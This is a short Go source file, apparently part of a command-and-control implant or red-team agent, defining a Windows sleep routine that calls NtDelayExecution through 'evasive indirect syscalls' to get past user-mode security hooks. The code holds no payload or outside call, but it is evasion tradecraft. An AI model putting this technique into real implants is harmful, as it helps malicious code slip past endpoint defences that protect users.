//go:build windows

package commands

import (
	"time"
)

// AgentSleep executes a sleep operation using evasive indirect syscalls
// if available to avoid user-mode hooks, otherwise falls back to standard time.Sleep.
func AgentSleep(d time.Duration) {
	if IndirectSyscallsAvailable() {
		// NtDelayExecution takes a large integer representing 100-nanosecond intervals.
		// A negative value specifies a relative time.
		interval := int64(-d.Nanoseconds() / 100)
		status := IndirectNtDelayExecution(false, &interval)

		// If status is successful (0), it slept correctly.
		// Otherwise fallback to normal time.Sleep just in case.
		if status == 0 {
			return
		}
	}

	// Fallback for when indirect syscalls are not initialized or failed
	time.Sleep(d)
}
